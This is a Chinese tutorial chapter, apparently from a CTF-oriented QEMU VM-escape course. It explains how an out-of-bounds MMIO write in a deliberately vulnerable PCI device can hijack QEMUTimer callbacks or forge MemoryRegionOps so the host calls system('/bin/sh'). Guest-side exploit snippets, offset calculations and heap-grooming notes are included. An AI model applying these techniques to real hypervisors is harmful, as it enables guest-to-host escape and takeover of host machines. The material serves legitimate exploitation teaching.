# Ch 21 — 從任意寫到 RIP：劫持 callback / 偽造物件

> **目標**：利用 OOB 寫覆蓋函式指標（MemoryRegionOps.write 或 QEMUTimer.cb），再透過 guest MMIO 觸發，讓 QEMU host 的 RIP 跳到我們指定的位址。

> **環境**：QEMU 9.0/x86-64/Linux

---

## 為什麼需要這個？

Ch 20 我們確認了兩個最佳劫持目標：`MemoryRegion.ops->write` 與 `QEMUTimer.cb`。
但「確認目標」和「實際讓 RIP 跳過去」之間還差一段距離。

這段距離包含三個問題：

1. **往哪裡寫**：OOB 只能往 `buf[]` 之後的高地址寫，`MemoryRegion` 在 struct 裡排在 `buf` 前面，所以不能直接覆蓋自己的 ops 指標。
2. **寫什麼**：寫一個假地址不夠，指標必須指向一個「長得像 MemoryRegionOps 的記憶體區塊」，否則 QEMU 讀欄位時會崩在奇怪的地方。
3. **怎麼觸發**：覆蓋完之後，還要讓 QEMU 主動去呼叫那個指標。

本章把這三個問題串起來，走完從任意寫到 RIP 的完整路徑。

---

## 先建立直覺

### 直覺 1：你能寫的地方決定你能打什麼

`VulnState` 的記憶體佈局：

```
offset 0x000: PCIDevice pdev         (~0xf8 bytes, QEMU 9.0)
offset ~0x0f8: MemoryRegion mmio     (~0x100+ bytes)
              ↳ MemoryRegion.ops     ← 我們想改的指標，在 mmio 內某個偏移
offset ~0x1f8: char buf[0x100]       ← OOB 寫的起點
offset ~0x2f8: uint32_t status
               (heap chunk end)
offset ~0x300+: 下一個 heap chunk    ← OOB 能打到這裡
```

MMIO write 的 idx = addr - 0x10，addr 最大 0xfef（BAR0 size 0x1000 扣掉 offset 0x10 的起點），所以 OOB 最遠能寫到 `buf[0xfef]`，也就是從 `buf` 基址往後近 4 KB。

`mmio` 在 `buf` **前面**，所以 OOB 往後打打不到自己的 `mmio.ops`。
打到的是 VulnState **之後** 的 heap 記憶體，也就是下一個 chunk。

### 直覺 2：偽造物件 vs 打鄰居物件

兩種思路，各有用場：

**思路 A — 打鄰居（adjacent object）**
透過 heap grooming 讓某個含函式指標的物件（QEMUTimer、另一個 MemoryRegion）緊接在 VulnState 後面，然後 OOB 直接覆蓋它的函式指標欄位。不需要偽造完整 struct，但需要精確控制 heap layout。

**思路 B — 偽造 ops struct（fake ops）**
先用 MMIO 寫把一個假的 `MemoryRegionOps` 寫入某個我們控制的 heap buffer，再另外覆蓋某個 `MemoryRegion.ops` 指標指向這塊假 struct。ops->write 就是我們的目標 RIP。

兩條路的差異在於：

| | 思路 A | 思路 B |
|---|---|---|
| 需要 grooming | 是，且精度高 | 部分需要（確保 fake struct 存活） |
| OOB 精度要求 | 高（要剛好打到函式指標偏移） | 中（只要打到 ops 指標就好） |
| struct 完整性 | 只改一個欄位，其餘不動 | 需要構造合法的 fake MemoryRegionOps |
| 觸發難度 | 等 timer 到期 / 再次 MMIO | 再次 MMIO 即可 |

實際 CTF 中通常先試思路 A（簡單），打不穩再換思路 B。

### 直覺 3：opaque 是你的 RDI

`ops->write(opaque, addr, val, size)` 的 x86-64 calling convention：

```
RDI = opaque      ← MemoryRegion.opaque，可控
RSI = addr
RDX = val
RCX = size
```

如果 `ops->write` 指向 `system@plt`，RDI 指向一塊含 `/bin/sh\0` 的 buffer，那就是 `system("/bin/sh")`，直接 host shell。

---

## 底層機制：覆蓋 → 觸發 → 劫持

### 結構偏移確認

**永遠用 pahole 確認，不要猜：**

```bash
# 確認 VulnState 佈局
pahole -C VulnState /path/to/qemu-system-x86_64

# 確認 MemoryRegion 內 ops 的偏移
pahole -C MemoryRegion /path/to/qemu-system-x86_64 | grep -A2 ops

# 或在 GDB 裡直接量
(gdb) p &((VulnState*)s)->mmio.ops
(gdb) p &((VulnState*)s)->buf
# 兩個地址相減就是 ops 距 buf 起點的偏移（負值，代表 ops 在 buf 之前）
```

QEMU 9.0 實際數字會因編譯選項（debug/release/padding）而不同。
以下用概念性偏移標示，實測時以 pahole 輸出為準。

### 思路 A：打鄰居 QEMUTimer

**Heap grooming 目標**：讓一個 QEMUTimer 的 heap chunk 緊接在 VulnState chunk 之後。

QEMUTimer 結構（簡化）：

```c
struct QEMUTimer {
    int64_t  expire_time;   // offset 0x00
    QEMUTimerList *timer_list; // offset 0x08
    QEMUTimerCB  *cb;       // offset 0x10  ← 目標
    void         *opaque;   // offset 0x18  ← RDI
    QEMUTimer    *next;     // offset 0x20
    int           scale;    // offset 0x28
    int           attributes;
};
```

OOB 寫計算（未實測，理論預期）：

```
buf 基址 = &vulnstate->buf = VulnState 基址 + ~0x1f8
VulnState chunk 大小 ≈ 0x310（含 header，對齊到 glibc chunk size）
QEMUTimer chunk 緊接在後：
  QEMUTimer 基址 = VulnState 基址 + 0x310
  timer.cb 在 QEMUTimer+0x10
  → 從 buf 起點的距離 = 0x310 - 0x1f8 + 0x10 = 0x128
  → idx = 0x128
  → MMIO write addr = 0x10 + 0x128 = 0x138
```

覆蓋步驟：

```c
// guest exploit（未實測，理論預期）
// Step 1: 寫 fake_cb 地址到 timer.cb
uint64_t target_cb = qemu_pie_base + offset_of_system; // 來自 Ch 16 infoleak
mmio_write64(BAR0 + 0x138, target_cb);  // 覆蓋 timer.cb

// Step 2: 寫 fake_opaque 到 timer.opaque（/bin/sh 字串位址）
uint64_t binsh_addr = heap_base + offset_of_binsh_in_buf;
mmio_write64(BAR0 + 0x138 + 0x08, binsh_addr);  // 覆蓋 timer.opaque

// Step 3: 觸發（等 timer 到期 or 修改 expire_time 為過去）
// 如果 timer 的 expire_time 設成 0，qemu_clock_run_timers 會立刻觸發
mmio_write64(BAR0 + 0x138 - 0x10, 0);  // 覆蓋 expire_time = 0
```

觸發後，QEMU 在 `timer_list_run_timers()` 裡執行 `ts->cb(ts->opaque)`，RIP 跳到我們指定的地址。

### 思路 B：偽造 MemoryRegionOps

**前提**：需要能覆蓋某個 `MemoryRegion.ops` 指標。

`MemoryRegionOps` 結構（關鍵欄位）：

```c
struct MemoryRegionOps {
    uint64_t (*read)(void *opaque, hwaddr addr, unsigned size);   // offset 0x00
    void     (*write)(void *opaque, hwaddr addr, uint64_t data,   // offset 0x08
                      unsigned size);
    // ... 其他欄位
    MemoryRegionOpsAccessMode valid;   // offset 0x18+
    MemoryRegionOpsAccessMode impl;
    enum device_endian endianness;     // 必須是 DEVICE_LITTLE_ENDIAN = 2
    // ...
};
```

**偽造流程**：

```c
// guest exploit（未實測，理論預期）

// Step 1: 把 fake MemoryRegionOps 寫入 buf[] 的已知位址
// buf 基址 = heap_base + buf_offset（從 Ch 16/17 infoleak 取得）

uint64_t fake_ops_addr = heap_base + buf_offset;  // fake ops 放在 buf 開頭
uint64_t system_plt    = qemu_pie_base + system_plt_offset;
uint64_t binsh_in_buf  = fake_ops_addr + 0x80;    // /bin/sh 放在 fake ops 後面

// 寫 fake ops struct
mmio_write64(BAR0 + 0x10 + 0x00, 0);              // .read = NULL（或一個安全 gadget）
mmio_write64(BAR0 + 0x10 + 0x08, system_plt);     // .write = system@plt
// ... 填 valid/impl 欄位為 0（接受任何 size/addr）...
mmio_write32(BAR0 + 0x10 + endianness_offset, 2); // endianness = DEVICE_LITTLE_ENDIAN

// Step 2: 把 /bin/sh 字串寫到 buf+0x80
mmio_write64(BAR0 + 0x10 + 0x80, 0x0068732f6e69622f); // "/bin/sh\0"

// Step 3: 覆蓋某個 MemoryRegion.ops 指標指向 fake_ops_addr
// 這需要另一條寫原語（或 grooming 讓 ops 欄位落在 OOB 範圍內）
// 假設透過 heap overflow 能打到目標 ops 欄位
overwrite_qword(target_mr_ops_addr, fake_ops_addr);

// Step 4: 修改 opaque 指向 binsh_in_buf
overwrite_qword(target_mr_opaque_addr, binsh_in_buf);

// Step 5: 觸發 MMIO write → ops->write(opaque, addr, val, size)
mmio_write32(BAR0 + trigger_offset, 0xdeadbeef);
// → QEMU 呼叫 system(binsh_in_buf) → host shell
```

### 時序圖

```
Guest (VM)                           QEMU Host Process
    │                                        │
    │  [Phase 1: 佈置 fake ops]              │
    │  MMIO write (buf+0x00~0x80)            │
    │  寫入 fake MemoryRegionOps             │
    ├───────────────────────────────────────>│
    │                                        │ vuln_mmio_write: buf[0..0x80] 填入
    │                                        │ fake ops 結構 + "/bin/sh"
    │                                        │
    │  [Phase 2: 覆蓋函式指標]              │
    │  MMIO write (大 offset，OOB)           │
    ├───────────────────────────────────────>│
    │                                        │ OOB: 覆蓋 timer.cb = system@plt
    │                                        │      覆蓋 timer.opaque = &binsh
    │                                        │  或
    │                                        │      覆蓋 mr.ops = &fake_ops
    │                                        │      覆蓋 mr.opaque = &binsh
    │                                        │
    │  [Phase 3: 觸發]                       │
    │  MMIO write (正常 offset) 或等 timer   │
    ├───────────────────────────────────────>│
    │                                        │ dispatch: ops->write(opaque, ...)
    │                                        │     或 timer_cb(opaque)
    │                                        │              │
    │                                        │              └─ RIP = system@plt
    │                                        │                 RDI = &"/bin/sh"
    │                                        │                       │
    │  ← ← ← ← ← ← ← ← ← ← ← ← ← ← ← ←│ host shell spawned ←──┘
    │  (guest 可能當機或繼續，視情況)        │
```

---

## 對比與取捨

| 維度 | 思路 A（打鄰居 timer） | 思路 B（偽造 fake ops） |
|------|----------------------|----------------------|
| **Grooming 難度** | 高，需要精確控制 heap | 中，只要控制 buf 內容就夠 |
| **偏移計算** | 必須精確到 8 bytes | ops 指標覆蓋需要另一條寫原語 |
| **觸發方式** | 等 timer 或改 expire_time | 再次做任何 MMIO write |
| **endianness 問題** | 無（直接呼叫 cb） | fake ops 必須設對 endianness |
| **適用場景** | device 有 embedded timer | 有多條寫原語 / 能做 heap spray |
| **穩定性** | 受 heap layout 影響大 | 相對穩定，fake struct 自己控 |
| **CTF 常見度** | 高（edu device 就是這路） | 中（需要更多 leak） |

`endianness` 欄位容易被忽略：QEMU 在 dispatch 之前會檢查 `mr->ops->endianness`，若不是 `DEVICE_LITTLE_ENDIAN (2)` 可能走進 byte-swap 分支或直接 abort。

---

## 踩雷集錦

**1. pahole 輸出和執行期偏移不一致**

`pahole` 讀的是 DWARF debug info，但如果 binary 是 stripped 的或 debug info 不完整，輸出可能不準。
正確做法：GDB 附加 QEMU 後直接 `p &s->mmio.ops - (void*)s` 量活的 process。

**2. OOB 寫的 idx 上限是 0xfef，不是 0xfff**

BAR0 size 0x1000，buf write 從 offset 0x10 開始，所以 idx = addr - 0x10，最大 addr = 0xfff → idx = 0xfef。
如果 target 欄位的偏移超出這個範圍，得換方法（heap spray 到更近的位置）。

**3. fake MemoryRegionOps 的 valid/impl 欄位不能全 0**

`memory_region_dispatch_write()` 在呼叫 `ops->write` 之前會檢查 `ops->valid.max_access_size` 等欄位。
全 0 代表「不接受任何 access size」，可能進入 error path 或根本不 dispatch。
保守做法：把 `valid.min_access_size = 1, valid.max_access_size = 8, impl.min_access_size = 1, impl.max_access_size = 8`。

**4. Heap grooming 在 ASLR 下的時機問題**

ASLR 每次執行地址不同，但 heap layout 受分配順序決定，相對偏移通常穩定。
如果前面的 exploit 步驟有 allocation/free side effect，grooming 後的 layout 可能偏移。
做法：在 grooming 前做一次 heap spray 把 free list 清乾淨，再做精確分配。

**5. 偽造 ops 後，.read 欄位不能是 NULL**

如果 QEMU 在觸發前對同一個 MemoryRegion 做 MMIO read，`ops->read(opaque, ...)` 會 dereference NULL → SIGSEGV。
保守做法：把 fake ops 的 `.read` 設為某個可安全呼叫的 gadget 或 `return_0` 類 stub。

---

## 進階：再往深一層

### 多 MemoryRegion 的 ops 共享問題

QEMU 允許多個 `MemoryRegion` 共用同一個 `ops` 指標（指向同一個 `const MemoryRegionOps`）。如果我們覆蓋了 ops 指標，影響的只是**單一 MemoryRegion 實例**（因為 ops 是 per-instance 的指標），不影響其他共用相同 ops struct 的 region。反過來說，如果你試圖「直接修改 .rodata 裡的 ops struct」，所有用這個 ops 的 region 都會受影響——但 .rodata 不可寫，所以這是理論上的討論。

### opaque 不一定是 MemoryRegion.opaque

`memory_region_init_io()` 設定 `mr->opaque = opaque` 參數。在 vuln device 裡，`vuln_mmio_ops` 的 opaque 通常是 `VulnState*` 本身。如果我們無法修改 opaque，那 RDI 就是 `VulnState*`，而不是 `/bin/sh` 的地址。這種情況要換方式控制 RDI，例如在 VulnState 開頭放字串，或換一個 calling convention 友好的 gadget。

### 一次寫完所有欄位的原子性問題

如果 QEMU 是多執行緒的（它有 main thread + vcpu thread + io thread），在 Phase 1（佈置 fake ops）和 Phase 2（覆蓋指標）之間，QEMU 可能因為其他事件去 dispatch 那個 MemoryRegion，此時 ops 還沒被覆蓋，會讀到舊 ops。這不是問題。
危險的是反過來：指標先被覆蓋、fake struct 還沒寫完時就被 dispatch。實作上要先寫完 fake struct，再去覆蓋指標，不能反過來。

### 如果目標是 `__free_hook`（glibc 2.33 以前）

在非常舊的 QEMU + glibc 環境，`__free_hook` / `__malloc_hook` 是簡單直接的目標——覆蓋成 `system`，觸發任何帶有 `/bin/sh` 字串的 free，就能 RCE。
glibc 2.34 起 hook 移除，現代 CTF 不再適用，但舊題目可以看到這條路。

---

## 動手練習

**練習 1：用 pahole + GDB 測量 VulnState 佈局（未實測，理論預期）**

```bash
# 1. 編譯帶 debug info 的 QEMU（或使用 CTF 提供的 binary + 附帶符號）
pahole -C VulnState ./qemu-system-x86_64 2>/dev/null

# 2. 啟動 QEMU，GDB 附加，找到 VulnState 指標 s
(gdb) break vuln_mmio_write
(gdb) p (long)&s->mmio.ops - (long)s
(gdb) p (long)&s->buf - (long)s
(gdb) p (long)&s->status - (long)s

# 紀錄三個偏移，確認 mmio.ops < buf < status 的排列順序
```

**練習 2：手動構造 fake MemoryRegionOps（靜態分析）**

```c
// 不需要執行，在紙上或 GDB 裡驗證
// 1. 找 memory_region_dispatch_write() 的 source（hw/core/memory.c）
// 2. 追它在呼叫 ops->write 之前檢查哪些欄位
// 3. 列出 fake ops 需要填什麼才能通過所有檢查

// 參考欄位（QEMU 9.0，未實測）：
// ops->endianness == DEVICE_LITTLE_ENDIAN (2) — 否則進 byte swap
// ops->valid.max_access_size >= size        — 否則拆成多個小 access
// ops->impl.max_access_size >= size         — 同上
```

**練習 3：在本地 QEMU 上驗證 OOB 偏移（未實測，理論預期）**

```c
// guest exploit snippet（Linux kernel module 或直接 /dev/mem）
volatile uint32_t *mmio = mmap(...);  // 映射 BAR0

// 先讀已知 struct 欄位確認偏移是否對齊
// 例如 status 在 buf+0x100，用大 idx 讀應該能讀到 status 值
// 如果 vuln_mmio_read 也有 OOB（Ch 12 說有），可以用來 validate
uint32_t val = mmio[(0x04 + 0x100) / 4];  // buf[0x100] = status ?
printf("status via OOB read = 0x%x\n", val);  // 應和直接讀 status offset 一致
```

---

## 本章重點整理

- `VulnState` 佈局：`mmio` 在 `buf` **前面**，OOB 向後只能打到 VulnState **之後**的 heap 物件。
- 兩條主要路徑：打鄰居物件（需要 grooming + timer）或偽造 fake ops struct（需要多條寫原語）。
- fake MemoryRegionOps 必須填對 `endianness = 2` 以及 `valid/impl` size 欄位，否則 dispatch 不到 `ops->write`。
- `ops->write(opaque, addr, val, size)` 呼叫時，RDI = opaque，控制 opaque 就是控制第一個參數。
- 時序上：**先寫完 fake struct，再覆蓋指標**，避免競爭窗口。
- **所有偏移必須用 pahole 和 GDB 實測確認**，本章數字為理論預期值。

---

## 自我檢核

- [ ] 我能說明為什麼 OOB 從 `buf[]` 往後寫，打不到 `mmio.ops`。
- [ ] 我能用 pahole 指令列出 VulnState 的 field layout，並指出 `mmio.ops` 的絕對偏移。
- [ ] 我能解釋 fake MemoryRegionOps 需要哪些欄位填正確才能讓 QEMU dispatch 到 `.write`。
- [ ] 我能畫出「OOB 覆蓋 → fake ops → MMIO trigger → RIP = target」的完整時序。
- [ ] 我能說明 `ops->write(opaque, ...)` 呼叫時，RDI/RSI/RDX/RCX 分別對應什麼。
- [ ] 我知道為什麼要先佈置 fake struct 再去覆蓋指標，而不是反過來。
- [ ] 我能指出 `endianness` 欄位填錯的後果是什麼。
- [ ] 我知道在 glibc 2.34+ 的環境中，`__free_hook` 路徑為什麼不再可用。

---

## 延伸閱讀

1. **QEMU 原始碼：memory_region_dispatch_write()**
   `hw/core/memory.c`，搜尋 `memory_region_dispatch_write`，直接讀 dispatch 前的所有欄位檢查。
   URL: https://gitlab.com/qemu-project/qemu/-/blob/master/system/memory.c

2. **Breaking Out of VirtualBox — MMIO Escape（RealWorld CTF 2018 writeup by SorryMyBad）**
   示範 fake ops 技術在真實 CTF 題目上的應用，包含 heap grooming 和 opaque 控制。
   搜尋：「breaking out of virtualbox escape MMIO fake ops writeup」

3. **QEMU Escape — pahole struct layout analysis（vnik blog）**
   專門討論如何用 pahole 確認 PCIDevice / MemoryRegion 偏移，並對照 GDB 動態量測。
   搜尋：「vnik qemu escape pahole struct layout」

4. **glibc malloc internals — heap grooming for adjacent allocation**
   理解 heap grooming 為何在 ptmalloc2 下可預測。
   URL: https://sourceware.org/glibc/wiki/MallocInternals

5. **phrack 0x45 — "Exploiting the Hard Stuff" by argp & karl**
   雖然是舊文，對「確認目標指標 → 偽造 struct → 觸發」的思路描述至今仍準確。
   URL: http://phrack.org/issues/67/8.html

---

本章打通了從任意寫到 RIP 控制的最後一公里：偽造 fake ops、計算 OOB 偏移、控制 RDI，三件事合在一起就是一個可執行的劫持計畫。

下一章要解決的是：光控制 RIP 還不夠——現代 QEMU 跑在 NX + PIE + Full RELRO 下，跳到 `system@plt` 不一定那麼直接。我們需要 ROP 鏈來繞過這些防護，Ch 22 帶你在 QEMU 的 `.text` 裡找 gadget，串出能呼叫 `system("/bin/sh")` 的 ROP chain。

→ [Ch 22 — ROP in QEMU：在 Host Process 中串 ROP Chain](./22-rop-in-qemu.md)
